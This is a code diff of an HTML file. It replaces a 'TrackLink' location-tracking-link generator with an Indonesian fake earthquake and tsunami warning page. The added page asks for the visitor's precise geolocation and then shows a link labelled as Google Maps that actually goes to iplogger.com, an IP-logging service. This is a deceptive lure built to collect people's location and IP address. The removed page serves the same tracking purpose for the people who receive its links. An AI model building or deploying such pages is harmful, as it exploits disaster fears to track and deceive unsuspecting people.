@@ -1,574 +1,147 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>TrackLink - Create Tracking Links</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Activator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
 
-    :root {
-      --color-bg: #ffffff;
-      --color-text-primary: #111827;
-      --color-text-secondary: #6b7280;
-      --color-accent: #111827;
-      --color-accent-hover: #374151;
-      --radius: 0.75rem;
-      --shadow-light: 0 1px 3px rgba(0,0,0,0.1);
-      --font-family: 'Inter', sans-serif;
-      --spacing-vertical-lg: 4rem; /* 64px */
-      --spacing-vertical-md: 2.5rem; /* 40px */
-      --spacing-vertical-sm: 1.5rem; /* 24px */
-      --max-width: 1200px;
-    }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
 
-    /* Reset & base */
-    * {
-      box-sizing: border-box;
-    }
-    html, body {
-      margin: 0; padding: 0;
-      background: var(--color-bg);
-      color: var(--color-text-primary);
-      font-family: var(--font-family);
-      font-size: 18px;
-      line-height: 1.6;
-      min-height: 100vh;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-    a {
-      color: var(--color-accent);
-      text-decoration: none;
-      transition: color 0.3s ease;
-    }
-    a:hover, a:focus {
-      color: var(--color-accent-hover);
-      outline-offset: 2px;
-    }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
 
-    /* Layout Container */
-    .container {
-      max-width: var(--max-width);
-      margin: 0 auto;
-      padding-left: 1rem;
-      padding-right: 1rem;
-    }
+        p {
+            color: #666;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
 
-    /* Header */
-    header {
-      position: sticky;
-      top: 0;
-      background: var(--color-bg);
-      border-bottom: 1px solid #e5e7eb;
-      padding: 1rem 0;
-      z-index: 20;
-      box-shadow: 0 1px 4px rgb(0 0 0 / 0.05);
-    }
-    header .container {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    header h1 {
-      font-weight: 800;
-      font-size: 1.75rem;
-      margin: 0;
-      color: var(--color-accent);
-      user-select: none;
-    }
-    nav a {
-      margin-left: 1.5rem;
-      font-weight: 600;
-      color: var(--color-text-secondary);
-      font-size: 1rem;
-      user-select: none;
-      position: relative;
-      padding: 0.25rem 0;
-    }
-    nav a:hover, nav a:focus {
-      color: var(--color-accent);
-      outline: none;
-    }
-    nav a.active {
-      font-weight: 700;
-      color: var(--color-accent);
-      border-bottom: 3px solid var(--color-accent);
-      padding-bottom: 0.25rem;
-    }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
 
-    /* Sections */
-    main {
-      padding-top: var(--spacing-vertical-lg);
-      padding-bottom: var(--spacing-vertical-lg);
-      min-height: calc(100vh - 68px);
-      /* 68px header height approx */
-    }
+        button:hover {
+            background-color: #0056b3;
+        }
 
-    /* Hero for Create Link */
-    .hero {
-      max-width: 700px;
-      margin: 0 auto 3rem auto;
-      text-align: center;
-      user-select: none;
-    }
-    .hero h1 {
-      font-weight: 800;
-      font-size: 3rem;
-      line-height: 1.1;
-      color: var(--color-accent);
-      margin-bottom: 0.5rem;
-    }
-    .hero p {
-      font-size: 1.25rem;
-      color: var(--color-text-secondary);
-      margin-bottom: 2rem;
-    }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #333;
+        }
 
-    /* Form */
-    form#create-form {
-      margin: 0 auto;
-      max-width: 480px;
-      display: flex;
-      gap: 1rem;
-      flex-wrap: wrap;
-      justify-content: center;
-    }
-    input[type="text"]#input-label {
-      flex: 1 0 270px;
-      padding: 0.75rem 1rem;
-      font-size: 1rem;
-      border: 1.5px solid #d1d5db;
-      border-radius: var(--radius);
-      transition: border-color 0.3s ease, box-shadow 0.3s ease;
-    }
-    input[type="text"]#input-label:focus {
-      outline: none;
-      border-color: var(--color-accent);
-      box-shadow: 0 0 0 3px rgba(17,24,39,0.15);
-    }
-    button#create-btn {
-      background: var(--color-accent);
-      color: white;
-      border: none;
-      padding: 0 1.75rem;
-      font-weight: 700;
-      font-size: 1rem;
-      border-radius: var(--radius);
-      cursor: pointer;
-      transition: background-color 0.3s ease, transform 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-width: 140px;
-    }
-    button#create-btn:hover,
-    button#create-btn:focus {
-      background: var(--color-accent-hover);
-      transform: scale(1.05);
-      outline: none;
-    }
-    button#create-btn:disabled {
-      background: #9ca3af;
-      cursor: not-allowed;
-      transform: none;
-    }
-    #form-desc {
-      font-size: 0.875rem;
-      color: var(--color-text-secondary);
-      margin-top: 0.75rem;
-      text-align: center;
-      user-select: none;
-    }
+        #coordinates {
+            margin-top: 10px;
+            color: #007bff;
+        }
 
-    /* Section headings */
-    section h2 {
-      font-weight: 700;
-      font-size: 2.25rem;
-      margin: var(--spacing-vertical-md) 0 1rem;
-      color: var(--color-accent);
-      user-select: none;
-      text-align: center;
-    }
-
-    /* Cards for links */
-    .card {
-      background: #f9fafb;
-      border-radius: var(--radius);
-      box-shadow: var(--shadow-light);
-      padding: 1.5rem;
-      margin-top: 1.5rem;
-      transition: box-shadow 0.3s ease;
-      max-width: 900px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    .card:focus-within,
-    .card:hover {
-      box-shadow: 0 0 12px rgba(17,24,39,0.2);
-      outline: none;
-    }
-
-    .small-text {
-      font-size: 0.875rem;
-      color: var(--color-text-secondary);
-      user-select: none;
-    }
-    .tracking-link {
-      font-weight: 600;
-      color: var(--color-accent);
-      word-break: break-word;
-      cursor: text;
-      user-select: all;
-    }
-
-    /* Visitors table */
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 1rem;
-      font-size: 0.9rem;
-      user-select: none;
-    }
-    th, td {
-      text-align: left;
-      padding: 0.5rem 0.75rem;
-      border-bottom: 1px solid #e5e7eb;
-      font-variant-numeric: tabular-nums;
-    }
-    th {
-      color: var(--color-text-secondary);
-      font-weight: 600;
-    }
-
-    /* Status messages */
-    .status-msg {
-      margin-top: 1rem;
-      font-weight: 600;
-      color: var(--color-text-secondary);
-      user-select: none;
-    }
-    .status-msg.success {
-      color: #10b981; /* green-500 */
-    }
-    .status-msg.error {
-      color: #ef4444; /* red-500 */
-    }
-
-    /* Tracking page layout */
-    #tracking-page {
-      max-width: 600px;
-      margin: 3rem auto;
-      text-align: center;
-      padding: 2rem 1rem;
-      border-radius: var(--radius);
-      background: #f9fafb;
-      box-shadow: var(--shadow-light);
-      user-select: none;
-    }
-    #tracking-page button {
-      width: 100%;
-      margin-top: 1.5rem;
-      font-weight: 700;
-      font-size: 1.1rem;
-      padding: 0.75rem;
-      border-radius: var(--radius);
-      background: var(--color-accent);
-      color: white;
-      border: none;
-      cursor: pointer;
-      transition: background-color 0.3s ease, transform 0.3s ease;
-    }
-    #tracking-page button:hover,
-    #tracking-page button:focus {
-      background: var(--color-accent-hover);
-      transform: scale(1.05);
-      outline: none;
-    }
-    #tracking-info {
-      margin-top: 1.5rem;
-      color: var(--color-text-secondary);
-      font-size: 1rem;
-      min-height: 2rem;
-      user-select: text;
-    }
-
-    /* Responsive adjustments */
-    @media (max-width: 700px) {
-      .hero h1 {
-        font-size: 2.25rem;
-      }
-      main {
-        padding-top: var(--spacing-vertical-md);
-        padding-bottom: var(--spacing-vertical-md);
-      }
-      #tracking-page {
-        margin: 2rem 1rem;
-      }
-    }
-  </style>
+        #map {
+            margin-top: 20px;
+            height: 200px; /* Sesuaikan sesuai kebutuhan */
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-
-<header role="banner">
-  <div class="container">
-    <h1 tabindex="-1">TrackLink</h1>
-    <nav role="navigation" aria-label="Primary navigation">
-      <a href="#" id="nav-create" tabindex="0" class="active" aria-current="page">Create</a>
-      <a href="#" id="nav-tracking" tabindex="0" style="display:none;">Track</a>
-    </nav>
-  </div>
-</header>
-
-<main>
-  <!-- Create Link Page -->
-  <section id="create-page" aria-live="polite" class="container">
-    <div class="hero" role="region" aria-labelledby="hero-heading">
-      <h1 id="hero-heading">Build your tracking link</h1>
-      <p class="lead">Generate a unique link that tracks visitors' locations when opened.</p>
-      <form id="create-form" aria-describedby="form-desc" novalidate>
-        <input
-          type="text"
-          id="input-label"
-          name="label"
-          placeholder="Label for your link (optional)"
-          aria-label="Custom label for tracking link"
-          autocomplete="off"
-          spellcheck="false"
-        />
-        <button type="submit" id="create-btn" aria-live="polite" aria-busy="false" aria-label="Create tracking link">
-          Create Link
-        </button>
-      </form>
-      <p id="form-desc" class="small-text">Use labels to organize your tracking links.</p>
+    <div class="container">
+        <h1>Waspada Gempa !!</h1>
+        <p>Lokasi Lokasi berikut berpotensei terjadinya gempa yang menyebabkan tsunami</p>
+        <button id="getLocationButton">Lihat Lokasi Gempa</button>
+        <p id="status"></p>
+        <p id="coordinates"></p>
+        <div id="map"></div>
     </div>
 
-    <section id="links-section" aria-live="polite" aria-relevant="additions removals" role="region" aria-labelledby="links-heading">
-      <h2 id="links-heading">Your Tracking Links</h2>
-      <div id="links-list" tabindex="-1">
-        <p>No tracking links created yet.</p>
-      </div>
-    </section>
-  </section>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const getLocationButton = document.getElementById('getLocationButton');
+            const statusDiv = document.getElementById('status');
+            const coordinatesDiv = document.getElementById('coordinates');
+            const mapDiv = document.getElementById('map');
 
-  <!-- Tracking Page -->
-  <section id="tracking-page" hidden aria-live="polite" class="container" role="main">
-    <h2>Tracking Link Activated</h2>
-    <p>This page will capture your location (with permission) to log your visit.</p>
-    <button id="btn-get-location" aria-describedby="tracking-info" aria-label="Allow location access">
-      Allow Location Access
-    </button>
-    <p id="tracking-info" class="small-text" role="status" aria-live="polite"></p>
-  </section>
-</main>
+            getLocationButton.addEventListener('click', () => {
+                if ("geolocation" in navigator) {
+                    statusDiv.textContent = "Meminta lokasi...";
+                    // Opsi untuk getCurrentPosition:
+                    // enableHighAccuracy: true untuk pembacaan yang lebih akurat (menggunakan GPS jika tersedia)
+                    // timeout: waktu maksimum (dalam milidetik) untuk menunggu posisi
+                    // maximumAge: usia maksimum (dalam milidetik) dari posisi yang mungkin disimpan dalam cache
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            // Callback sukses
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            statusDiv.textContent = "Lokasi berhasil diakses!";
+                            coordinatesDiv.textContent = `Lintang: ${latitude}, Bujur: ${longitude}`;
 
-<script>
-(() => {
-  const createPage = document.getElementById('create-page');
-  const trackingPage = document.getElementById('tracking-page');
-  const navCreate = document.getElementById('nav-create');
-  const navTracking = document.getElementById('nav-tracking');
+                            // Anda dapat mengintegrasikan dengan layanan peta di sini (misalnya, Google Maps, OpenStreetMap)
+                            // Untuk demonstrasi, kita hanya akan menampilkan placeholder atau tautan
+                            mapDiv.innerHTML = `<a href="https://iplogger.com/Xupfc" target="_blank">Lihat di Google Maps</a>`;
+                            mapDiv.style.backgroundColor = '#d4edda'; // Hijau muda untuk sukses
+                        },
+                        (error) => {
+                            // Callback error
+                            statusDiv.textContent = "Error mendapatkan lokasi.";
+                            coordinatesDiv.textContent = "";
+                            mapDiv.innerHTML = '';
+                            mapDiv.style.backgroundColor = '#f8d7da'; // Merah muda untuk error
 
-  const linksList = document.getElementById('links-list');
-  const createForm = document.getElementById('create-form');
-  const inputLabel = document.getElementById('input-label');
-  const createBtn = document.getElementById('create-btn');
-
-  const btnGetLocation = document.getElementById('btn-get-location');
-  const trackingInfo = document.getElementById('tracking-info');
-
-  // Storage keys
-  const STORAGE_KEY_LINKS = 'tracklink_links';
-  const STORAGE_KEY_LOCATIONS = 'tracklink_locations';
-
-  // Base URL for tracking links (same page with param)
-  const BASE_URL = window.location.origin + window.location.pathname;
-
-  // Generate unique ID for links
-  function generateUID() {
-    return 'id-' + Math.random().toString(36).slice(2, 10);
-  }
-
-  // Read/write localStorage helpers
-  function readLinks() {
-    try {
-      return JSON.parse(localStorage.getItem(STORAGE_KEY_LINKS)) || [];
-    } catch {
-      return [];
-    }
-  }
-  function saveLinks(links) {
-    localStorage.setItem(STORAGE_KEY_LINKS, JSON.stringify(links));
-  }
-  function readLocations() {
-    try {
-      return JSON.parse(localStorage.getItem(STORAGE_KEY_LOCATIONS)) || {};
-    } catch {
-      return {};
-    }
-  }
-  function saveLocations(locations) {
-    localStorage.setItem(STORAGE_KEY_LOCATIONS, JSON.stringify(locations));
-  }
-
-  // Render tracking links and visitor data
-  function renderLinks() {
-    const links = readLinks();
-    const locations = readLocations();
-    if (links.length === 0) {
-      linksList.innerHTML = '<p>No tracking links created yet.</p>';
-      return;
-    }
-    const listHtml = links.map(link => {
-      const linkUrl = `${BASE_URL}?track=${encodeURIComponent(link.id)}`;
-      const visitorData = locations[link.id] || [];
-      let visitorsHtml = '';
-      if (visitorData.length === 0) {
-        visitorsHtml = '<small>No visitors tracked yet.</small>';
-      } else {
-        visitorsHtml = '<table aria-label="Visitors for ' + (link.label || 'Unnamed Link') + '"><thead><tr><th>Date & Time</th><th>Latitude</th><th>Longitude</th></tr></thead><tbody>' +
-          visitorData.map(entry =>
-            `<tr><td>${new Date(entry.timestamp).toLocaleString()}</td><td>${entry.latitude.toFixed(5)}</td><td>${entry.longitude.toFixed(5)}</td></tr>`).join('') +
-          '</tbody></table>';
-      }
-      return `
-        <div class="card" tabindex="0" aria-label="Tracking link ${link.label || 'Unnamed Link'}">
-          <p><strong>${link.label || 'Unnamed Link'}</strong></p>
-          <p class="tracking-link" title="${linkUrl}">
-            <a href="${linkUrl}" target="_blank" rel="noopener noreferrer">${linkUrl}</a>
-          </p>
-          ${visitorsHtml}
-        </div>
-      `;
-    }).join('');
-    linksList.innerHTML = listHtml;
-    // autofocus the first link for keyboard users
-    const firstCard = linksList.querySelector('.card');
-    if (firstCard) {
-      firstCard.focus();
-    }
-  }
-
-  // Create new tracking link
-  createForm.addEventListener('submit', e => {
-    e.preventDefault();
-    const label = inputLabel.value.trim();
-    createBtn.disabled = true;
-    createBtn.setAttribute('aria-busy', 'true');
-    const id = generateUID();
-    const links = readLinks();
-    links.push({id, label});
-    saveLinks(links);
-    inputLabel.value = '';
-    renderLinks();
-    createBtn.disabled = false;
-    createBtn.removeAttribute('aria-busy');
-    createBtn.focus();
-  });
-
-  // Get tracking id from URL query param ?track=...
-  function getTrackingIdFromUrl() {
-    const params = new URLSearchParams(window.location.search);
-    return params.get('track');
-  }
-
-  // Show page according to URL
-  function showPage() {
-    const trackId = getTrackingIdFromUrl();
-    if (trackId) {
-      createPage.hidden = true;
-      trackingPage.hidden = false;
-      navCreate.classList.remove('active');
-      navTracking.classList.add('active');
-      navTracking.style.display = 'inline';
-    } else {
-      createPage.hidden = false;
-      trackingPage.hidden = true;
-      navCreate.classList.add('active');
-      navTracking.classList.remove('active');
-      navTracking.style.display = 'none';
-    }
-  }
-
-  // Navigation links
-  navCreate.addEventListener('click', e => {
-    e.preventDefault();
-    if (getTrackingIdFromUrl()) {
-      history.pushState({}, '', BASE_URL);
-      showPage();
-    }
-  });
-  navTracking.addEventListener('click', e => {
-    e.preventDefault();
-    const trackId = getTrackingIdFromUrl();
-    if (trackId) {
-      history.pushState({}, '', `${BASE_URL}?track=${encodeURIComponent(trackId)}`);
-      showPage();
-    }
-  });
-
-  // Location capture on tracking page
-  btnGetLocation.addEventListener('click', () => {
-    trackingInfo.textContent = 'Requesting location permission…';
-    btnGetLocation.disabled = true;
-    navigator.geolocation.getCurrentPosition(success, error, {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
-    });
-  });
-
-  function success(position) {
-    const crd = position.coords;
-    trackingInfo.textContent = `Thank you! Location captured:
-Latitude ${crd.latitude.toFixed(5)}, Longitude ${crd.longitude.toFixed(5)}.`;
-    // Save location against trackId in localStorage
-    const trackId = getTrackingIdFromUrl();
-    if (!trackId) return;
-    const locations = readLocations();
-    if (!locations[trackId]) locations[trackId] = [];
-    locations[trackId].push({
-      latitude: crd.latitude,
-      longitude: crd.longitude,
-      timestamp: Date.now()
-    });
-    saveLocations(locations);
-    btnGetLocation.disabled = false;
-  }
-
-  function error(err) {
-    trackingInfo.textContent = `Error getting location: ${err.message}`;
-    btnGetLocation.disabled = false;
-  }
-
-  // On popstate (back/forward navigation)
-  window.addEventListener('popstate', () => {
-    showPage();
-  });
-
-  // Initial rendering
-  renderLinks();
-  showPage();
-})();
-</script>
-
-<!--
-Usage Instructions:
-
-- This is a complete static website.
-- To use via GitHub, create a repository and upload this file as "index.html".
-- In the repository settings, enable GitHub Pages, choose the main branch root (or the docs folder if preferred) as the source.
-- Your site will be accessible at https://your-username.github.io/your-repo-name/
-- Open the site URL to create tracking links.
-- When you create a tracking link, it generates a unique URL with ?track= parameter.
-- Sharing that link to visitors lets them allow location access; their locations are saved in browser localStorage.
-- Locations are only viewable by you (the creator) on the main page of the site in the same browser.
-- No backend or server is needed; all data is stored locally in the browser.
-- For collaborative or centralized location collection, backend services would be required.
-
-Enjoy your self-hosted GitHub Pages tracking link generator!
--->
-
+                            switch (error.code) {
+                                case error.PERMISSION_DENIED:
+                                    coordinatesDiv.textContent = "Pengguna menolak permintaan Geolocation.";
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    coordinatesDiv.textContent = "Informasi lokasi tidak tersedia.";
+                                    break;
+                                case error.TIMEOUT:
+                                    coordinatesDiv.textContent = "Permintaan untuk mendapatkan lokasi pengguna telah habis waktu.";
+                                    break;
+                                case error.UNKNOWN_ERROR:
+                                    coordinatesDiv.textContent = "Terjadi kesalahan yang tidak diketahui.";
+                                    break;
+                            }
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000, // 10 detik
+                            maximumAge: 0 // Jangan gunakan posisi yang disimpan dalam cache
+                        }
+                    );
+                } else {
+                    statusDiv.textContent = "Geolocation tidak didukung oleh peramban Anda.";
+                    coordinatesDiv.textContent = "";
+                }
+            });
+        });
+    </script>
 </body>
 </html>
-
